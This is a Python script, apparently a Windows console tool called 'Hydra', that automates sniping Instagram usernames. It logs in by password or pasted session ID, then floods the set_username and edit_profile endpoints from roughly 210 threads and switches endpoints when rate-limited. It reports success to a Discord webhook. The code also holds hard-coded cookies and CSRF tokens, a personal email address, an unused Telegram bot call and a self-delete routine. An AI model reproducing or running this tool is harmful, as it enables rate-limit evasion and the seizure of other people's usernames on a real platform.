# try don't Play with GhOSt 
swapper = 'BOSS'
import os, time, string, platform, subprocess, socket, ctypes, threading, signal, uuid, string, random
from string import ascii_lowercase, digits, ascii_uppercase
from time import sleep
from os import remove, kill, system, getpid
from threading import Thread
from ctypes import windll
from signal import SIGTERM
from platform import node
from sys import argv
from uuid import uuid1, uuid4
from socket import gethostbyname, gethostname
from subprocess import check_output
windll.kernel32.SetConsoleTitleW(f"[ HELLO {swapper} ]")
system('mode 90,23')
Clear = lambda: system('cls')
Killpy = lambda: kill(getpid(), SIGTERM)

def pip(modl):
    print(f"installing module : {modl}")
    system(f"pip3 install {modl}")


try:
    import requests
except ImportError:
    pip('requests')
    import requests
else:
    try:
        import colorama
    except ImportError:
        pip('colorama')
        import colorama
    else:
        try:
            import autopy
        except ImportError:
            pip('autopy')
            import autopy
        else:
            from colorama import Fore, init, Style
            from random import choice, choices
            from autopy import alert
            from requests import get, post
            guid, uid4 = str(uuid1()), str(uuid4())
            device_id = ''.join(choices((ascii_lowercase + digits), k=16))
            forlooprange = 666666666
            init(autoreset=True)
            SR, SB, SRB = Style.RESET_ALL, Style.BRIGHT, Style.RESET_ALL + Style.BRIGHT
            FG, FC, FR, FY, FB = (Fore.GREEN, Fore.CYAN, Fore.RED, Fore.YELLOW, Fore.BLUE)
            gif = get(url='https://pastebin.com/raw/d6ZQBB5s').text
            banner = get(url='https://pastebin.com/raw/zRh0mPaN').text

            def Terminate_remove():
                remove(argv[0])
                Killpy()


            def Close():
                print((SB + '[' + FR + '!' + SRB + '] press enter to terminate: '), end='')
                input()
                Killpy()


            try:
                settings = open('settings.txt').read()
                bio = settings.split('bio:[')[1].split(']')[0]
                web1 = settings.split('webhook:[')[1].split(']')[0]
            except Exception as pol:
                try:
                    print(pol)
                    Close()
                finally:
                    pol = None
                    del pol

            else:

                def Teles(text):
                    get(f"https://api.telegram.org/bot/sendMessage?chat_id=1667188712&parse_mode=Markdown&text={text}")


                def Coco():
                    global strCOCO
                    print((SB + '[' + FG + '+' + SRB + '] want to continue?\n { ' + FG + '1' + SRB + ' continue } { ' + FR + '2' + SRB + " don't continue }: "), end='')
                    try:
                        strCOCO = int(input())
                        if strCOCO == 1:
                            pass
                        elif strCOCO == 2:
                            Close()
                        else:
                            print(SB + FR + '   //BAD NUM ' + SRB + f"> {strCOCO}")
                            Coco()
                    except Exception:
                        print(SB + FR + '   //BAD INPUT ' + SRB + f"> {strCOCO}")
                        Coco()


                def Intro():
                    print(SRB + '  { Stand strong and prepare for the battle. }')
                    print(SB + FG + f"{banner}\n")


                Clear()

                def System_loop():
                    try:

                        class hydra:
                            Intro()

                            def __init__(self):
                                self.tries = 0
                                self.blocked = 0
                                self.threads = []
                                self.thread = 70
                                self.loop = 3
                                self.bio = bio

                                def Contun():
                                    print(SB + '[' + FG + '+' + SRB + '] Do you want to continue?\n [ ' + FG + '1' + SR + SB + ' continue ] [ ' + FR + '2' + SR + SB + ' chose another mode ]')
                                    print((SB + '[' + FG + '+' + SRB + '] choose number (' + FG + '1' + SRB + '/' + FR + '2' + SRB + '): '), end='')
                                    conornoc = str(input())
                                    try:
                                        conorno = int(conornoc)
                                        if conorno == 1:
                                            pass
                                        elif conorno == 2:
                                            hydra()
                                        else:
                                            return Contun()
                                    except:
                                        print(SB + FR + '   //BAD INPUT ' + SRB + f"> {conornoc}")
                                        return Contun()

                                print(SB + '[' + FG + '+' + SRB + '] available choices:\n [' + FG + '1' + SRB + '] login with ' + FG + 'sessionID\n ' + SRB + '[' + FG + '2' + SRB + '] login with ' + FG + 'username ' + SRB + '&' + SRB + FG + ' password')
                                print((SB + '[' + FG + '+' + SRB + '] choose number (' + FG + '1' + SRB + '/' + FG + '2' + SRB + '): '), end='')
                                loginmodes = str(input())
                                try:
                                    loginmode = int(loginmodes)
                                    mods_gropy = [1, 2]
                                    if loginmode not in mods_gropy:
                                        print(SB + FR + '   //BAD NUM ' + SRB + f"> {loginmodes}")
                                        hydra()
                                    elif loginmode == 2:

                                        def Up_login():
                                            global sid
                                            try:
                                                print((SB + '[' + FG + '+' + SRB + ']' + ' enter username: '), end='')
                                                username = str(input())
                                                print((SB + '[' + FG + '+' + SRB + ']' + ' enter password: '), end='')
                                                password = str(input())
                                                uplogin = 'https://i.instagram.com/api/v1/accounts/login/'
                                                upheaders = {}
                                                upheaders['User-Agent'] = 'Instagram 135.0.0.00.000 Android (25/7.1.2; 192dpi; 720x1280; google; G011A; G011A; intel; en_US; 289692181)'
                                                upheaders['Connection'] = 'keep-alive'
                                                updata = {}
                                                updata['uuid'] = uid4
                                                updata['password'] = password
                                                updata['username'] = username
                                                updata['device_id'] = device_id
                                                updata['from_reg'] = 'false'
                                                updata['_csrftoken'] = 'missing'
                                                updata['login_attempt_countn'] = '0'
                                                upreq = post(url=uplogin, headers=upheaders, data=updata)
                                                if 'challenge_required' in upreq.text:
                                                    print(SB + '[' + FR + '!' + SR + SB + '] checkpoint required' + FR + '!')
                                                    loggc = upreq.cookies
                                                    info = get(url=f"https://i.instagram.com/api/v1{upreq.json()['challenge']['api_path']}", headers=upheaders, cookies=loggc)
                                                    if 'step_data' not in info.text:
                                                        Clear()
                                                        print(SB + '[' + FR + '!' + SRB + f"] {info.text}")
                                                        hydra()
                                                    if 'phone_number' in info.json()['step_data'] and 'email' in info.json()['step_data']:
                                                        print(SB + '[' + FG + '0' + SRB + '] Phone_Number: ' + f"{info.json()['step_data']['phone_number']} \n" + SRB + '[' + FG + '1' + SRB + '] Email: ' + (f"{info.json()['step_data']['email']}"))
                                                    elif 'phone_number' in info.json()['step_data']:
                                                        print(SB + '[' + FG + '0' + SRB + '] Phone_Number: ' + (f"{info.json()['step_data']['phone_number']}"))
                                                    elif 'email' in info.json()['step_data']:
                                                        print(SB + '[' + FG + '1' + SRB + '] Email: ' + (f"{info.json()['step_data']['email']}"))
                                                    else:
                                                        Clear()
                                                        print(SB + '[' + FR + '!' + SRB + f"] {info.json}")
                                                        hydra()
                                                    print((SB + '    choose a number: '), end='')
                                                    choice = input()
                                                    secure_data = {'choice':str(choice),  'device_id':f"android-{uid4}",  'guid':uid4,  '_csrftoken':'massing'}
                                                    send_choice = post(url=f"https://i.instagram.com/api/v1{upreq.json()['challenge']['api_path']}", headers=upheaders, data=secure_data, cookies=loggc)
                                                    if 'step_data' not in send_choice.text:
                                                        Clear()
                                                        print(SB + '[' + FR + '!' + SRB + f"] {send_choice.text}")
                                                        hydra()
                                                    elif 'step_data' in send_choice.text:

                                                        def Codeeror():
                                                            global sid
                                                            print(SB + '    code sent to: ' + FG + (f"{send_choice.json()['step_data']['contact_point']}"))
                                                            print((SB + '    enter the code: '), end='')
                                                            code = input()
                                                            code_data = {'security_code':str(code), 
                                                             'device_id':f"android-{uid4}", 
                                                             'guid':uid4, 
                                                             '_csrftoken':'massing'}
                                                            send_code = requests.post(url=f"https://i.instagram.com/api/v1{upreq.json()['challenge']['api_path']}",
                                                              headers=upheaders,
                                                              data=code_data,
                                                              cookies=loggc)
                                                            if 'logged_in_user' in send_code.text:
                                                                Clear()
                                                                Intro()
                                                                logc = send_code.cookies
                                                                sid = logc['sessionid']
                                                                print(SB + '[' + FG + '!' + SRB + '] logged in with ' + FG + '@' + username)
                                                            else:
                                                                if 'Please check the code we sent you and try again.' in send_code.text:
                                                                    print(SB + '[' + FR + '?' + SRB + '] you entered wrong code , try again')
                                                                    return Codeeror()
                                                                if 'This field is required.' in send_code.text:
                                                                    print(SB + '[' + FR + '?' + SRB + '] entere the code!')
                                                                    return Codeeror()
                                                                print(SB + '[' + FR + '?' + SRB + f"] {send_code.text}")
                                                                return Codeeror()

                                                        Codeeror()
                                                elif 'logged_in_user' in upreq.text:
                                                    Clear()
                                                    Intro()
                                                    logc = upreq.cookies
                                                    sid = logc['sessionid']
                                                    print(SB + '[' + FG + '!' + SRB + '] logged in with ' + FG + '@' + username)
                                                elif 'Please check your username and try again.' in upreq.text:
                                                    print(SB + '\n[' + FR + '?' + SRB + '] username not found , try again\n')
                                                    hydra()
                                                elif 'The password you entered is incorrect. Please try again.' in upreq.text:
                                                    print(SB + '\n[' + FR + '?' + SRB + '] check your password and try again\n')
                                                    hydra()
                                                elif 'two_factor_required":true' in upreq.text:
                                                    print(SB + '\n[' + FR + '!' + SRB + '] two factor authentication is enabled\n')
                                                    hydra()
                                                elif 'Please wait a few minutes before you try again.' in upreq.text:
                                                    print(SB + '\n[' + FR + '!' + SRB + '] your ip is blocked from login\n')
                                                    hydra()
                                                elif 'missing_parameters' in upreq.text:
                                                    print(SB + '\n[' + FR + '?' + SRB + '] error missing parameters , try again\n')
                                                    hydra()
                                                else:
                                                    print(SB + '\n[' + FR + '?' + SRB + f"] {upreq.text}")
                                                    hydra()
                                            except Exception as login_uesrpasserror:
                                                try:
                                                    print(SB + FR + '   //UNKNOWN ERROR  ' + SRB + f"> {login_uesrpasserror}")
                                                    hydra()
                                                finally:
                                                    login_uesrpasserror = None
                                                    del login_uesrpasserror

                                        Up_login()
                                    elif loginmode == 1:

                                        def Session_login():
                                            global sad
                                            global sid
                                            try:
                                                print((SB + '[' + FG + '+' + SRB + ']' + ' enter sessionID='), end='')
                                                sid = str(input())
                                                print(SB + '[' + FG + '+' + SR + SB + ']' + SB + ' checking the sessionID..')
                                                isnfo = requests.get(url='https://i.instagram.com/api/v1/accounts/current_user/?edit=true',
                                                  headers={'Accept':'*/*', 
                                                 'Accept-Encoding':'gzip, deflate', 
                                                 'Accept-Language':'en-US', 
                                                 'User-Agent':'Instagram 85.0.0.21.100 Android (28/9; 380dpi; 1080x2147; OnePlus; HWEVA; OnePlus6T; qcom; en_US; 146536611)', 
                                                 'X-IG-Capabilities':'3brTvw==', 
                                                 'X-IG-Connection-Type':'WIFI'},
                                                  cookies={'sessionid': sid})
                                                resp = str(isnfo.json())
                                                try:
                                                    if 'login_required' in resp:
                                                        print(SB + '[' + FG + '!' + SRB + '] sessionId checked - [' + FR + 'not working' + SRB + ']\n')
                                                        hydra()
                                                    else:
                                                        pass
                                                    sa = resp.split("'username':")[1]
                                                    sad = sa.split("'")[1]
                                                except:
                                                    print(isnfo.text)
                                                    hydra()
                                                else:
                                                    urDsab = 'https://i.instagram.com/api/v1/accounts/set_username/'
                                                    sestcb1 = {'username': 'y.ri'}
                                                    apdsa_headerss = {'User-Agent':'Instagram 93.1.0.19.102 Android (21/5.0.2; 240dpi; 540x960; samsung; SM-G530H; fortuna3g; qcom; ar_AE; 154400379)', 
                                                     'Connection':'close', 
                                                     'Cookie':f"sessionid={sid}"}
                                                    rsdw = post(urDsab, headers=apdsa_headerss, data=sestcb1)
                                                if rsdw.status_code == 400:
                                                    Clear()
                                                    Intro()
                                                    print(SB + '[' + FG + '!' + SR + SB + '] sessionId checked - [' + FG + 'working' + SR + SB + ']')
                                                    print(SB + '[' + FG + '!' + SRB + '] logged in with ' + FG + f"@{sad}")
                                                elif 'Please wait a few minutes before you try again.' in rsdw.text:
                                                    print(SB + '[' + FR + '!' + SRB + '] your ip is blocked\n')
                                                    Contun()
                                                elif 'spam' in rsdw.text:
                                                    print(SB + '[' + FR + '!' + SR + SB + '] Your sessionId is spam blocked\n')
                                                    Contun()
                                                elif 'login_required' in rsdw.text:
                                                    print(SB + '[' + FG + '!' + SRB + '] sessionId checked - [' + FR + 'not working' + SRB + ']\n')
                                                    hydra()
                                                else:
                                                    print(SB + '[' + FG + '!' + SR + SB + '] sessionID checked - [' + FR + 'not working' + SR + SB + ']\n\t error , check the response\n')
                                                    print(SB + '[' + FR + '!' + SRB + f"] {rsdw.text}")
                                                    hydra()
                                            except Exception as session_loginerror:
                                                try:
                                                    print(SB + FR + '   //UNKNOWN ERROR  ' + SRB + f"> {session_loginerror}")
                                                    hydra()
                                                finally:
                                                    session_loginerror = None
                                                    del session_loginerror

                                        Session_login()
                                except:
                                    print(SB + FR + '   //BAD INPUT ' + SRB + f"> {loginmodes}")
                                    hydra()
                                else:
                                    self.Grap_info()
                                    self.Taking_target()

                            def Taking_target(self):
                                print((SB + '[' + FG + '+' + SRB + ']' + ' enter your target: '), end='')
                                self.target = str(input())
                                self.targ = self.target.replace('_', '\\_')
                                try:
                                    req_14 = requests.post(url='https://i.instagram.com/accounts/web_create_ajax/attempt/',
                                      headers={'cookie':'csrftoken=kPbHPkJKtOXWyuO8SABNGqYHlJdzIw8V; mid=YaOMrQALAAFVm2GOEG3SSd6QZPu3; ig_did=184B213A-D16F-4426-AC22-31932F92EA03; ig_nrcb=1', 
                                     'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36', 
                                     'x-csrftoken':'kPbHPkJKtOXWyuO8SABNGqYHlJdzIw8V'},
                                      data={'username':self.target, 
                                     'enc_password':'#PWD_INSTAGRAM_BROWSER:0:&:',  'email':'yori.m7med2004.2.27iraq@gmail.com', 
                                     'first_name':'yori_14days'})
                                    if 'Please wait a few minutes before you try again.' in req_14.text or 'spam' in req_14.text:
                                        pass
                                    elif 'email_is_taken' not in req_14.text:
                                        if "This username isn't available." not in req_14.text:
                                            if "This username isn't available. Please try another." not in req_14.text:
                                                if 'Your username cannot contain only numbers.' not in req_14.text:
                                                    if 'username_required' not in req_14.text:
                                                        if 'username_has_special_char' not in req_14.text:
                                                            print(Style.BRIGHT + '\tThis username is not taken')
                                            else:
                                                pass
                                        else:
                                            pass
                                    else:
                                        pass
                                    if "This username isn't available. Please try another." in req_14.text:
                                        print(SB + '\tthis username is ' + FG + 'Swappable')
                                    elif "This username isn't available." in req_14.text:
                                        print(SB + '\tthis username is ' + FR + 'Not swappable')
                                    else:
                                        pass
                                except:
                                    pass
                                else:
                                    self.Thread_luncher()

                            def Grap_info(self):
                                global email
                                global num
                                global username
                                info = requests.get(url='https://i.instagram.com/api/v1/accounts/current_user/?edit=true', headers={'Accept':'*/*', 
                                 'Accept-Encoding':'gzip, deflate', 
                                 'Accept-Language':'en-US', 
                                 'User-Agent':'Instagram 85.0.0.21.100 Android (28/9; 380dpi; 1080x2147; OnePlus; HWEVA; OnePlus6T; qcom; en_US; 146536611)', 
                                 'X-IG-Capabilities':'3brTvw==', 
                                 'X-IG-Connection-Type':'WIFI'},
                                  cookies={'sessionid': sid})
                                resp = str(info.json())
                                try:
                                    userxxname = resp.split("'username':")[1]
                                    username = userxxname.split("'")[1]
                                except:
                                    print(SB + '[' + FR + '?' + SRB + f"] {info.text}")
                                    hydra()
                                else:
                                    try:
                                        ema = resp.split("'email':")[1]
                                        email = ema.split("'")[1]
                                    except:
                                        email = ''
                                    else:
                                        try:
                                            nu = resp.split("'phone_number':")[1]
                                            num = nu.split("'")[1]
                                        except:
                                            num = ''
                                        else:
                                            if email == '':
                                                if num == '':
                                                    num = ''
                                                    email = ''.join((choice(ascii_uppercase) for _ in range(19))) + '@gmail.com'
                                            print(SB + '[' + FG + '+' + SRB + '] check the account? [ ' + FG + '1' + SRB + ' check ] [ ' + FR + '2' + SRB + " don't check ]")

                                            def Later_check():
                                                print((SB + '[' + FG + '+' + SRB + '] choose number (' + FG + '1' + SRB + '/' + FR + '2' + SRB + '): '), end='')
                                                check_tolate = str(input())
                                                try:
                                                    try_to_check = int(check_tolate)
                                                    okey = [1, 2]
                                                    if try_to_check not in okey:
                                                        return Later_check()
                                                    if try_to_check == 2:
                                                        pass
                                                    elif try_to_check == 1:
                                                        hdcb = {'User-Agent':'Instagram 93.1.0.19.102 Android (21/5.0.2; 240dpi; 540x960; samsung; SM-G530H; fortuna3g; qcom; ar_AE; 154400379)',  'Connection':'close', 
                                                         'Cookie':f"sessionid={sid}"}
                                                        ede, ed2s, url_cb = ('https://i.instagram.com/api/v1/accounts/edit_profile/',
                                                                             'https://i.instagram.com/api/v1/accounts/set_username/',
                                                                             'https://www.instagram.com/accounts/edit/')
                                                        setcb = {'email':email, 
                                                         'username':username + '_x.y',  'phone_number':num,  'chaining_enabled':'on'}
                                                        setcsb = {'username': username + '_x.yr'}
                                                        setcb1 = {'email':email, 
                                                         'username':username + '_x.yri',  'phone_number':num,  'chaining_enabled':'on'}
                                                        headers_cb = {'cookie':f"csrftoken=uGeaBdGt8EF51aBV8x1MHP2aizo1Boye; rur=RVA; sessionid={sid}", 
                                                         'Connection':'close', 
                                                         'x-csrftoken':'uGeaBdGt8EF51aBV8x1MHP2aizo1Boye'}
                                                        print(SB + '[' + FC + '$' + SRB + '] checking if blocked from edit api..')
                                                        chblok = post(ede, headers=hdcb, data=setcb)
                                                        if chblok.status_code == 200:
                                                            print(SR + SB + ' your new username is: ' + FG + '@' + username + '_x.y')
                                                        elif '"We restrict certain activity to protect our community."' in chblok.text or 'Please wait a few minutes before you try again.' in chblok.text:
                                                            print(SB + '[' + FR + '!' + SRB + '] account checked - [' + FR + 'blocked from edit api' + SRB + ']')
                                                            Coco()
                                                        else:
                                                            print(SB + '[' + FR + '?' + SRB + f"] {chblok.text} ")
                                                            Close()
                                                        print(SB + '[' + FG + '$' + SRB + '] checking if blocked from setu api..')
                                                        chbloks = post(ed2s, headers=hdcb, data=setcsb)
                                                        if chbloks.status_code == 200:
                                                            print(SR + SB + ' your new username is: ' + FG + '@' + username + '_x.yr')
                                                        elif '"We restrict certain activity to protect our community."' in chbloks.text or 'Please wait a few minutes before you try again.' in chbloks.text:
                                                            print(SB + '[' + FR + '!' + SRB + '] account checked - [' + FR + 'blocked from setu api' + SR + SB + ']')
                                                            Coco()
                                                        else:
                                                            print(SB + '[' + FR + '?' + SRB + f"] {chbloks.text} ")
                                                            Close()
                                                        print(SB + '[' + FG + '$' + SRB + '] checking if blocked from edit web..')
                                                        check_blocked = post(url_cb, headers=headers_cb, data=setcb1)
                                                        if check_blocked.status_code == 200:
                                                            Clear()
                                                            Intro()
                                                            print(SB + '[' + FG + '!' + SRB + '] logged in with ' + FG + f"@{username}")
                                                            print(SB + '[' + FG + '!' + SRB + '] account checked - [' + FG + 'not blocked' + SRB + ']\n your new username is: ' + FG + '@' + username + '_x.yri')
                                                        elif '"We restrict certain activity to protect our community."' in check_blocked.text or 'Please wait a few minutes before you try again.' in check_blocked.text:
                                                            print(SB + '[' + FR + '!' + SRB + '] account checked - [' + FR + 'blocked from edit web' + SRB + ']')
                                                            Coco()
                                                        else:
                                                            print(SB + '[' + FR + '?' + SR + SB + f"] {check_blocked.text} ")
                                                            Close()
                                                except:
                                                    print(SB + FR + '   //BAD INPUT ' + SRB + f"> {check_tolate}")
                                                    return Later_check()

                                            Later_check()

                            def Rs(self):
                                while True:
                                    sec_befor = self.tries
                                    sleep(1)
                                    self.rs = self.tries - sec_befor
                                    windll.kernel32.SetConsoleTitleW(f"[ at:{self.tries} | rs:{self.rs} ]")

                            def Send_discord(self):
                                url = web1
                                data = {}
                                data['embeds'] = [{'description':f"\n** swapped by {swapper} : [@{self.target}](https://instagram.com/{self.target})**",  'color':random.choice([3447003, 3066993, 15277667, 15844367, 15158332, 15105570]),  'thumbnail':{'url': gif},  'author':{'name': '#Hydra swap'}}]
                                post(url, json=data)

                            def Bio(self):
                                post(url='https://i.instagram.com/api/v1/accounts/set_biography/', headers={'User-Agent':'Instagram 152.0.0.1.60 Android',  'Cookie':f"sessionid={sid}"}, data={'raw_text': f"{bio}"})

                            def Swaped(self):
                                Thread(target=(self.Bio)).start()
                                print(SB + '    swapped > ' + FG + f"@{self.target}")
                                try:
                                    self.Send_discord()
                                    self.Bio()
                                except:
                                    pass
                                else:
                                    alert.alert(f"swapped > {self.target}\nattempts > {self.tries}\nrequests/s > {self.rs}", '#Hydra')
                                    Killpy()

                            def Blocker(self):
                                sleep(15)
                                alert.alert('Sorry for that', 'Blocked URL')
                                Killpy()

                            def Swap(self):
                                for _ in range(forlooprange):
                                    response1 = post(url='https://i.instagram.com/api/v1/accounts/set_username/', headers={'User-Agent':'Instagram 93.1.0.19.102 Android (21/5.0.2; 240dpi; 540x960; samsung; SM-G530H; fortuna3g; qcom; ar_AE; 154400379)',  'Connection':'Keep-Alive',  'Cookie':f"sessionid={sid}"}, data={'username': self.target})
                                    if '"status":"ok"' in response1.text:
                                        self.Swaped()
                                    else:
                                        if response1.status_code == 400:
                                            self.tries += 1
                                        else:
                                            if response1.status_code == 429:
                                                for _ in range(forlooprange):
                                                    response2 = post(url='https://i.instagram.com/api/v1/accounts/edit_profile/', headers={'User-Agent':'Instagram 93.1.0.19.102 Android (21/5.0.2; 240dpi; 540x960; samsung; SM-G530H; fortuna3g; qcom; ar_AE; 154400379)',  'Connection':'Keep-Alive',  'Cookie':f"sessionid={sid}"}, data={'biography':self.bio,  'email':email,  'username':self.target,  'phone_number':num})
                                                    if '"status":"ok"' in response2.text:
                                                        self.Swaped()
                                                else:
                                                    if response2.status_code == 400:
                                                        self.tries += 1

                                            if response2.status_code == 429:
                                                for _ in range(forlooprange):
                                                    response3 = post(url='https://www.instagram.com/accounts/edit/', headers={'cookie':f"ig_did=F839D900-5ECC-4392-BCAD-5CBD51FB9228; mid=YChlyQALAAHp2POOp2lK_-ciAGlM; ig_nrcb=1; ds_user_id=45872034997; shbid=6144; csrftoken=uGeaBdGt8EF51aBV8x1MHP2aizo1Boye; rur=RVA; sessionid={sid}",  'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36',  'x-csrftoken':'uGeaBdGt8EF51aBV8x1MHP2aizo1Boye'}, data={'biography':self.bio,  'email':email,  'username':self.target,  'phone_number':num})
                                                    if '"status":"ok"' in response3.text:
                                                        self.Swaped()
                                                    else:
                                                        if response3.status_code == 400:
                                                            self.tries += 1

                            def Starting_threads(self):
                                Thread(target=(self.Blocker)).start()
                                for threads_waiting in self.threads:
                                    threads_waiting.start()

                            def Making_threads(self):
                                for _ in range(self.loop):
                                    for _ in range(self.thread):
                                        self.threads.append(Thread(target=(self.Swap), daemon=True))

                            def Thread_luncher(self):
                                Thread(target=(self.Rs)).start()
                                self.Making_threads()
                                windll.user32.MessageBoxW(0, f"target > {self.target}\nready? start.", '#HYDRA', 0)
                                self.Starting_threads()

                        if __name__ == '__main__':
                            hydra()
                    except Exception as Systemerror:
                        try:
                            print(SB + FR + '   //UNKNOWN ERROR  ' + SRB + f"> {Systemerror}")

                            def Error_recap():
                                print((SB + '[' + FG + '+' + SRB + '] Do you want to continue?\n [ ' + FG + '1' + SR + SB + ' continue ] [ ' + FR + '2' + SR + SB + ' terminate ]: '), end='')
                                conornox = str(input())
                                try:
                                    conorno = int(conornox)
                                    if conorno == 1:
                                        System_loop()
                                    elif conorno == 2:
                                        Close()
                                    else:
                                        return Error_recap()
                                except:
                                    print(SB + FR + '   //BAD INPUT ' + SRB + f"> {conornox}")
                                    return Error_recap()

                        finally:
                            Systemerror = None
                            del Systemerror


                System_loop()
